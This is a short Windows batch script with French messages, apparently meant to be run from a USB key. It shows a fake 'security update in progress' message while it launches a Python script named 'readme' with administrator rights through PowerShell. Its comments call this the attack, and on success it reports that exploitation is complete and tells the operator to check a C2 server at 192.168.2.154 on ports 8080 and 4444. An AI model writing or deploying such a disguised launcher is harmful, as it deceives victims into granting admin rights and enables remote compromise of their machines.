@echo off
echo *** Mise a jour de securite en cours. Ne retirez pas la cle USB. ***
cd /d %~dp0
echo Verification des pre-requis...

:: Verifie si Python est installe
where python >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo Erreur : Python n'est pas installe. Telechargez-le a https://www.python.org/downloads/ et ajoutez-le au PATH.
    pause
    exit /b
) else (
    echo Python detecte, lancement en cours...
)

:: Lance l'attaque avec privilèges administrateurs
echo Execution avec droits administrateurs...
powershell -Command "Start-Process python -Verb RunAs -ArgumentList 'readme' -WorkingDirectory '%CD%' -NoNewWindow -Wait"
if %ERRORLEVEL% neq 0 (
    echo Echec de l'execution admin. Code erreur : %ERRORLEVEL%. Exécutez manuellement avec droits admin.
    pause
) else (
    echo Exploitation terminee avec succes. Verifiez le serveur C2 (192.168.2.154:8080 et 4444).
)

:: Attente finale
timeout /t 5
echo Mise a jour terminee. Vous pouvez retirer la cle.
pause
